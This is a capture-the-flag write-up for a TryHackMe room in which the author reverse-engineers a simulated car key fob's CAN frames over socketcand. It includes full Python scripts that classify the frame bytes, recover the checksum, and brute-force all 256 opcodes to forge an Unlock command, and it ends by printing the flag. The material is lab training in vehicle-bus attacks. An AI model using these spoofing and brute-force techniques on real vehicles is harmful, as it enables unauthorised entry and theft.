# TryHackMe: Phantom Fob — Writeup

> ⚠️ **READ THIS FIRST — the room re-randomizes everything on every deploy.**
> Each instance randomizes the **CAN IDs**, the **byte positions** of every field,
> the **coupling math** of the checksum (one instance used XOR, another used
> addition), and **which byte is the checksum**. The concrete constants below
> (fob ID `0x139`, command @ byte 2, `b7 = ctr + cmd + E`, etc.) are from **one
> specific instance** and will NOT carry over. Do **not** copy-paste them into a
> fresh box. Re-derive the layout each time using `discover.py` + the method in
> "Reusable recipe." Observed instances in our sessions: fob ID `1F6`, `513`,
> `461` (a public writeup), `139` — all different layouts.

---

## Room premise

You're plugged into the CAN bus of a demo vehicle via a **socketcand** service.
The fob can **Lock** and **Horn** (and arm/disarm the immobiliser) through a web
panel, but has **no Unlock button**. The manufacturer claims the unlock command
"can't be copied." Goal: watch the bus, work out how the door commands are built,
and **forge a valid Unlock frame** yourself. The flag is released on the bus /
dashboard when a valid unlock is accepted.

## Recon

- `nmap` → `22/ssh`, `8080/http` (instrument-cluster web panel + `/press` API),
  `29536/socketcand` (CAN-over-TCP).
- Web panel buttons POST to `/press` with `{"button":"LOCK|HORN|IMMOB_ARM|IMMOB_DISARM"}`.
  There is deliberately no unlock button, and `/press` rejects made-up names
  (`UNLOCK`, `OPEN`, …) with `"no such control"`.
- `8080/events` is an SSE stream exposing live state: `locked`, `immob`, `horn`,
  `speed`, and `flag` (null until solved).

## Talking to the bus (socketcand)

```
printf 'x\n' | nc <IP> 29536        # greeting is "< hi >"
# session: send  < open vcan0 >  then  < rawmode >  then read frames:
#   < frame <ID> <ts> <8-byte-hex> >
# inject:  < send <ID> 8 B0 B1 B2 B3 B4 B5 B6 B7 >
```
Use **vcan0** (the challenge/display bus). `can0` is a documented pitfall.

## Finding the three frames that matter

Capture a 2 s baseline, then press each button and diff:
- **Fob frame** = the ID that only appears on a press (one frame per press).
  (This instance: `0x139`.)
- **State frame** = a low-rate frame whose byte flips on a real arm/disarm or
  lock/unlock. Spoofing it changes the *dashboard* but does **not** release the
  flag — the flag needs a real forged command. (This instance: a `01 [lock] [immob] a5 …` frame.)
- **Rolling/challenge frame** = a periodically broadcast value used as freshness.

## Decoding the fob frame (per-instance — example from the `0x139` box)

Press each button several times and classify each byte by how it behaves **over
time** and **across buttons**:

| byte | behaviour | meaning |
|---|---|---|
| 0,3,5 | constant always | structural (`48`,`d9`,`34`) |
| 2 | **stable per button, differs across buttons** | **command** (LOCK=`3a` HORN=`43` ARM=`d5` DISARM=`47`) |
| 4 | +1 every press | **counter** |
| 1,6 | change over time, **same for all commands in one window** | **freshness** (`K1`,`K6`) |
| 7 | changes | **checksum** |

**Key gotcha that cost me hours:** the command byte is the one that is *stable
per button but varies across buttons*. Several bytes "vary across buttons" in a
single snapshot simply because they're rolling — if you pick one of those as the
command, every forge is silently wrong. Always confirm stability across repeated
presses of the **same** button.

### Deriving the checksum

Capture a **same-window** LOCK and ARM (fire both within ~0.2 s, consecutive
counters). On the `139` box they shared `K1=13`, `K6=0c` → **freshness is
command-independent**. Only byte 7 differed, and it decoded as:

```
LOCK: b7 = 0x67 = e5(ctr) + 3a(cmd) + 0x48(E)
ARM : b7 = 0x03 = e6(ctr) + d5(cmd) + 0x48(E)
=>  b7 = (ctr + cmd + E) mod 256,  E freshness-derived, command-independent
```

(The `513` box had a different shape: `b0^b1^b7^ctr^cmd = 0x7e` with a
counter-coupled byte via **XOR**, i.e. `b0 = ctr ^ C0`. Same idea, different
math — hence the warning.)

## Forging the Unlock

There is no unlock opcode on the fob, but the validator only checks a valid
frame for the current freshness window. Recipe:

1. Capture a fresh **LOCK** frame → read `K1`, `K6`, `ctr`, `cmd`, `b7`.
2. Compute the freshness constant `E = (b7 − ctr − cmd) mod 256`.
3. Burst **all 256 candidate command bytes** at `ctr+1`, each with the correct
   checksum, keeping the captured freshness bytes, **immediately** (same window):
   ```
   frame = [48, K1, OPCODE, d9, ctr+1, 34, K6, (ctr+1 + OPCODE + E) & 0xFF]
   ```
4. Poll `/events` for `flag` / `locked:false`.

On the `139` box the unlock opcode landed on the 3rd capture-and-burst round and
the SSE stream returned `locked:false` with the flag.

## Flag

```
THM{C4r_H4cking_is_kind4_c00l}
```

---

## Solver code

Two scripts. **The only thing you must edit is the `HOST` line** (your target
room IP). `discover.py` prints the per-instance layout; you read that output and
fill in the clearly-marked `INSTANCE CONFIG` block in `solve.py`. Run from the
Kali box on the TryHackMe VPN.

### `discover.py` — classify the frame for THIS deploy

```python
#!/usr/bin/env python3
# ----------------------------------------------------------------------
# >>> YOUR MACHINE INFO: set this to the target room's IP <<<
HOST = "10.10.10.10"        # <-- CHANGE ME (THM room IP)
# ----------------------------------------------------------------------
CAN_PORT, WEB_PORT = 29536, 8080   # usually fixed for this room
import socket, time, json, urllib.request, re, threading
FRAME_RE = re.compile(rb"<\s*frame\s+([0-9A-Fa-f]+)\s+[0-9.]+\s+([0-9A-Fa-f\s]+)\s*>")

def conn():
    s = socket.create_connection((HOST, CAN_PORT), timeout=10); s.settimeout(0.1)
    try: s.recv(256)
    except: pass
    s.sendall(b"< open vcan0 >\n"); time.sleep(0.2)
    try: s.recv(256)
    except: pass
    s.sendall(b"< rawmode >\n"); time.sleep(0.2); return s

def press(b):
    try:
        urllib.request.urlopen(urllib.request.Request(
            f"http://{HOST}:{WEB_PORT}/press",
            data=json.dumps({"button": b}).encode(),
            headers={"Content-Type": "application/json"}, method="POST"), timeout=5).read()
    except: pass

def grab(s, dur):
    t = time.time(); out = []
    while time.time() - t < dur:
        try: d = s.recv(8192)
        except: continue
        for m in FRAME_RE.finditer(d):
            try: out.append((m.group(1).decode().upper(),
                             bytes.fromhex(re.sub(r"\s+", "", m.group(2).decode()))))
            except: pass
    return out

def pf(s, b, fob=None):
    th = threading.Thread(target=lambda: press(b)); th.start()
    fr = grab(s, 1.0); th.join()
    c = [p for cid, p in fr if len(p) == 8 and (fob is None or cid == fob)]
    return c[-1] if c else None

s = conn()
base = set(cid for cid, _ in grab(s, 2))
# find fob ID + a few frames per button
caps = {b: [] for b in ["LOCK", "HORN", "IMMOB_ARM", "IMMOB_DISARM"]}
fob = None
for b in caps:
    for _ in range(3):
        th = threading.Thread(target=lambda: press(b)); th.start()
        fr = grab(s, 1.0); th.join()
        for cid, p in fr:
            if cid not in base and len(p) == 8:
                fob = cid; caps[b].append(p)
print("FOB ID =", fob)
for b in caps:
    print(b, [p.hex() for p in caps[b]])
print("--- byte classification ---")
for i in range(8):
    perbtn = {b: set(p[i] for p in caps[b]) for b in caps if caps[b]}
    stable = all(len(v) == 1 for v in perbtn.values())
    across = stable and len(set(list(v)[0] for v in perbtn.values())) > 1
    tag = "CONST" if stable and not across else ("COMMAND?" if across else "variable(freshness/checksum/counter)")
    print(f"byte{i}: {tag}  { {b: sorted('%02x'%x for x in perbtn[b]) for b in perbtn} }")
# same-window multi-command sample to derive the checksum:
print("--- same-window LOCK,LOCK,ARM (consecutive counters) ---")
for b in ["LOCK", "LOCK", "IMMOB_ARM"]:
    threading.Thread(target=lambda b=b: press(b)).start()
fr = grab(s, 2.0)
for cid, p in fr:
    if cid == fob: print(p.hex())
s.close()
# Read the output:
#  - COUNTER  = the byte that increments +1 every press
#  - COMMAND  = the byte marked COMMAND? (stable per button, differs across)
#  - CONST    = structural constants (keep as-is)
#  - FRESHNESS= variable bytes that are IDENTICAL across the same-window commands
#  - CHECKSUM = the variable byte that DIFFERS across the same-window commands;
#               work out its formula from the same-window rows, e.g.
#               cksum = (ctr + cmd + E) mod 256    (addition-coupled), or
#               cksum = ctr ^ cmd ^ E              (xor-coupled)
```

### `solve.py` — forge the unlock

```python
#!/usr/bin/env python3
# ======================================================================
# INSTANCE CONFIG  — fill these in from discover.py output (they RANDOMIZE
# per deploy; do not reuse values from another box)
# ======================================================================
HOST       = "10.10.10.10"          # <-- YOUR MACHINE INFO: target room IP (CHANGE ME)
FOB_ID     = "139"                  # <-- fob CAN ID discover.py found
CMD_IDX    = 2                      # <-- command byte index
CTR_IDX    = 4                      # <-- counter byte index
CONSTS     = {0: 0x48, 3: 0xd9, 5: 0x34}   # <-- constant byte index:value
FRESH_IDX  = [1, 6]                 # <-- freshness byte indices (kept from capture)
CKSUM_IDX  = 7                      # <-- checksum byte index
KNOWN_CMDS = {0x3a, 0x43, 0xd5, 0x47}      # <-- LOCK/HORN/ARM/DISARM opcodes (skip in brute)

# Checksum model. Default is the addition form:  cksum = (ctr + cmd + E) mod 256
# where E is recovered per-window from a captured frame. If discover.py shows an
# XOR-coupled checksum instead, switch to the xor variant below.
def recover_E(cap):          # back out the freshness constant from a captured frame
    return (cap[CKSUM_IDX] - cap[CTR_IDX] - cap[CMD_IDX]) & 0xFF        # ADD form
    # XOR form:  return cap[CKSUM_IDX] ^ cap[CTR_IDX] ^ cap[CMD_IDX]
def make_cksum(ctr, cmd, E):
    return (ctr + cmd + E) & 0xFF                                       # ADD form
    # XOR form:  return ctr ^ cmd ^ E
# ======================================================================
CAN_PORT, WEB_PORT = 29536, 8080
import socket, time, json, urllib.request, re, threading
FRAME_RE = re.compile(rb"<\s*frame\s+([0-9A-Fa-f]+)\s+[0-9.]+\s+([0-9A-Fa-f\s]+)\s*>")

def conn():
    s = socket.create_connection((HOST, CAN_PORT), timeout=10); s.settimeout(0.05)
    try: s.recv(256)
    except: pass
    s.sendall(b"< open vcan0 >\n"); time.sleep(0.2)
    try: s.recv(256)
    except: pass
    s.sendall(b"< rawmode >\n"); time.sleep(0.2); return s

def press(b):
    try:
        urllib.request.urlopen(urllib.request.Request(
            f"http://{HOST}:{WEB_PORT}/press",
            data=json.dumps({"button": b}).encode(),
            headers={"Content-Type": "application/json"}, method="POST"), timeout=5).read()
    except: pass

def state():
    try:
        r = urllib.request.urlopen(f"http://{HOST}:{WEB_PORT}/events", timeout=2); t = time.time()
        while time.time() - t < 2:
            l = r.readline().decode()
            if l.startswith("data:"): return json.loads(l[5:])
    except: pass
    return {}

def capture(s, button="LOCK"):
    """Press a known button and grab the resulting fob frame (fresh window)."""
    threading.Thread(target=lambda: press(button)).start()
    t = time.time(); last = None
    while time.time() - t < 1.0:
        try: d = s.recv(8192)
        except: continue
        for m in FRAME_RE.finditer(d):
            if m.group(1).decode().upper() == FOB_ID:
                p = bytes.fromhex(re.sub(r"\s+", "", m.group(2).decode()))
                if len(p) == 8: last = p
    return last

def build(cap, opcode, ctr):
    E = recover_E(cap)
    f = bytearray(8)
    for i, v in CONSTS.items(): f[i] = v
    for i in FRESH_IDX:        f[i] = cap[i]          # keep window freshness
    f[CMD_IDX] = opcode
    f[CTR_IDX] = ctr
    f[CKSUM_IDX] = make_cksum(ctr, opcode, E)
    return bytes(f)

s = conn()
for rnd in range(12):
    cap = capture(s, "LOCK")
    if not cap: continue
    nxt = (cap[CTR_IDX] + 1) & 0xFF
    pkt = b""
    for op in range(256):                             # brute the unknown unlock opcode
        if op in KNOWN_CMDS: continue
        f = build(cap, op, nxt)
        pkt += ("< send %s 8 %s >\n" % (FOB_ID, " ".join("%02X" % x for x in f))).encode()
    s.sendall(pkt)                                    # burst in-window
    time.sleep(0.15)
    st = state()
    print("round %d  flag=%s  locked=%s" % (rnd, st.get("flag"), st.get("locked")), flush=True)
    if st.get("flag") or st.get("locked") is False:
        print("*** SUCCESS:", st.get("flag")); break
s.close()
```

## Reusable recipe (instance-agnostic)

1. `nmap`; confirm socketcand (`29536`) + web panel (`8080`).
2. Run `discover.py` (set `HOST`) → it prints the fob ID and classifies every byte.
3. From the output, identify: **command** (stable per button, differs across),
   **counter** (+1 per press), **constants** (never change),
   **freshness** (vary over time but identical across commands in the same window),
   **checksum** (whatever's left).
4. From the same-window `LOCK,LOCK,ARM` rows, derive the checksum relation (try
   addition and XOR, include `ctr` and `cmd` terms).
5. Fill the `INSTANCE CONFIG` block in `solve.py` and run it.

### Pitfalls that burned time
- Picking a rolling byte as the "command" (see gotcha above).
- Computing the checksum from a fixed per-capture offset that silently encodes
  the captured command → wrong for every other opcode. The checksum must carry
  the **command term** explicitly.
- Grab-latency staling the freshness window; capture and inject fast.
- Spoofing the **state** frame changes only the dashboard, never the flag.
- Assuming the previous instance's IDs/positions/math — they randomize.
